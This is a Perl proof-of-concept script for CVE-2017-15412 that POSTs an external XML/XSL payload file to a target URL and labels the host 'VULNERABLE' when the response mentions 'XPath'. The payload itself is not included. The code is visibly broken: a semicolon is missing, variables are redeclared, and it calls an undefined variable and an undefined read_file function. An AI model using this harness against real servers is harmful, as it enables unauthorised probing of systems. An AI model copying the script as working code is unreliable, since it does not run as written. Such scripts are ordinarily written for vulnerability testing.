#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

=pod

=head1 CVE-2017-15412

=head2 Date
<DATE>

=head2 Reporter(s)
<AUTHOR>

=head2 Description 

** 
RESERVED
**
This candidate has been reserved by an organization or individual that
will use it when announcing a new security problem.  When the
candidate has been publicized, the details for this candidate will be
provided.


=cut

# Global Variables
my $DEBUG = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-15412 ]=================================";
    
    print qq{
$title
            
   Reporter : <AUTHOR>
       Date : <DATE>
        CVE : CVE-2017-15412
            
Description :


** 
RESERVED
 **
This candidate has been reserved by an organization or individual that
will use it when announcing a new security problem.  When the
candidate has been publicized, the details for this candidate will be
provided.


};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");
    print " ____     __  __  ____                 ___       __      _     ________          _  ______  __ __       _      ___     \n";
    print "/\\  _`\\  /\\ \\/\\ \\/\\  _`\\             /'___`\\   /'__`\\  /' \\   /\\_____  \\       /' \\/\\  ___\\/\\ \\\\ \\    /' \\   /'___`\\   \n";
    print "\\ \\ \\/\\_\\\\ \\ \\ \\ \\ \\ \\L\\_\\          /\\_\\ /\\ \\ /\\ \\/\\ \\/\\_, \\  \\/___//'/'      /\\_, \\ \\ \\__/\\ \\ \\\\ \\  /\\_, \\ /\\_\\ /\\ \\  \n";
    print " \\ \\ \\/_/_\\ \\ \\ \\ \\ \\  _\\L   _______\\/_/// /__\\ \\ \\ \\ \\/_/\\ \\     /' /'_______\\/_/\\ \\ \\___``\\ \\ \\\\ \\_\\/_/\\ \\\\/_/// /__ \n";
    print "  \\ \\ \\L\\ \\\\ \\ \\_/ \\ \\ \\L\\ \\/\\______\\  // /_\\ \\\\ \\ \\_\\ \\ \\ \\ \\  /' /' /\\______\\  \\ \\ \\/\\ \\L\\ \\ \\__ ,__\\ \\ \\ \\  // /_\\ \\\n";
    print "   \\ \\____/ \\ `\\___/\\ \\____/\\/______/ /\\______/ \\ \\____/  \\ \\_\\/\\_/   \\/______/   \\ \\_\\ \\____/\\/_/\\_\\_/  \\ \\_\\/\\______/\n";
    print "    \\/___/   `\\/__/  \\/___/           \\/_____/   \\/___/    \\/_/\\//                 \\/_/\\/___/    \\/_/     \\/_/\\/_____/ \n";
    print "                                                                                                                       \n";
    print "                                                                                                                       \n";

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0  --url URL --path PATH --payload PAYLOAD --url URL [OPTIONS]
        
        # Arguments


            --url [VALUE]		: The Target URL [Format: scheme://host]
            --user-agent [VALUE]        : User-Agent To Send To Server
            --cookie [VALUE]		: Cookie String To Use
            --proxy [VALUE]		: Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]		: Max Timeout For The HTTP Requests
            --auth [VALUE]		: Credentials To Use For HTTP Login [Format: username:password]
            --help        		: Display The Help Menu
            --verbose        		: Be More Verbose
            --debug        		: Debug Mode
            --rule-dir [VALUE]          : Path To The ModSecurity Activated Rules (Default: /etc/httpd/modsecurity.d/activated_rules)
            --path [VALUE]		: Path To The XML Handler (Default: /)
            --payload [VALUE]		: The XML/XSL Payload File To Use (Default: src/payload.xml)
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'PUT', 'DELETE', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $payload = '?' . $payload if($payload);
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload) if($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $method = 0;
    my $content_type = 0;
    my $base_url = 0;
    my $base_path = 0;
    my $path = 0;
    my $payload = 0;
    my $vulnerable = 1;


    my $timeout = 0;		                               # Command Argument : timeout
    my $url = "http://127.0.0.1";		               # Command Argument : url
    my $rules_dir = "/etc/httpd/modsecurity.d/activated_rules" # Command Argument : rules-dir
    my $payload = "src/payload.xml";		               # Command Argument : payload
    my $useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";		# Command Argument : user-agent
    my $auth = 0;		                               # Command Argument : auth
    my $cookie_string = 0;		                       # Command Argument : cookie
    my $path = "/";		                               # Command Argument : path
    my $proxy = 0;		                               # Command Argument : proxy
    my $rule_file = "src/CVE_2017_15412_sec.rule";

    GetOptions(
    	"debug!"		=> \$DEBUG,
    	"timeout=i"		=> \$timeout,
    	"url=s"		        => \$url,
        "rules-dir=s"           => \$rules_dir,
    	"payload=s"		=> \$payload,
    	"user-agent=s"		=> \$useragent,
    	"verbose!"		=> \$VERBOSE,
    	"auth=s"		=> \$auth,
    	"cookie=s"		=> \$cookie_string,
    	"path=s"		=> \$path,
    	"help"		        => \&Help,
    	"proxy=s"		=> \$proxy,
    ) or error("Bad Value(s) Provided In Command Line Arguments");

### Required Arguments

    die error("Required Argument(s) Missing .") if(!$url || !$path || !$payload || !$url || !$rules_dir);    
    
    exploit_header();
    
    if($url =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i) {
        ($base_url, $base_path) = $url =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    }
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    $browser->default_header('Cookie' => $cookie_string) if($cookie_string);
    
    if($proxy) {
        if($proxy =~ /([a-z])+:\/\/.*:([0-9])+/i) {
            $browser->proxy( [qw( http https ftp ftps )] => $proxy);
        } else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }
    
    
    ### Build/send the requests

  $method = "POST";
  $payload = join("\n", read_file($payload, 1));
  $content_type = "text/xml";

  info("Sending payload [$payload] to handler [$handler_url] ...\"");
  info("Sending : ($method) $url$path");

  $request = buildRequest($url . $path, $method, $payload, $content_type);
  $response = $browser->request($request);
  displayResponse($response);

  $vulnerable = 0 if(!validate("TSTRING", "XPath ", $response));    

    ### Validate or not the test
    if($vulnerable) {
        print "\n\n" . color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is affected or any kind of validation was provided.\n";
    } else {
        print "\n\n" . color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is not affected.\n";
    }
    
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $status = "FAILED";
    my $status_color = "red";
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    warn("Expected : " . $header_parts[0] . " Not Found In Response Headers");
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        if($VERBOSE || $DEBUG) {
            if($positive) {
                $status = "SUCESS";
                $status_color = "green";
         
                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }
        
        return $positive;
    }
    
    return 0;
}

sub displayResponse {
    my ( $response ) = @_;
    
    print color("white") . "   [" . color("magenta") . "R" . color("white") . "]" . color("blue") . "( URL ) " . color("green") . $response->request->uri . "\n";
    print "\t" . color("blue") . "---[ HTTP Code : " . color("green") . $response->code . "\n";
    
    if($VERBOSE) {
        print "\t" . color("blue") . "---[ HTTP Status : " . color("green") . $response->status . "\n";
        print "\t" . color("blue") . "---[ HTTP Size : " . color("green") . length($response->content) . "\n";
    }
    
    if($DEBUG) {
        
    }
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("blue") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("blue") . "$text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("blue") . "$text\n";
    exit;
}
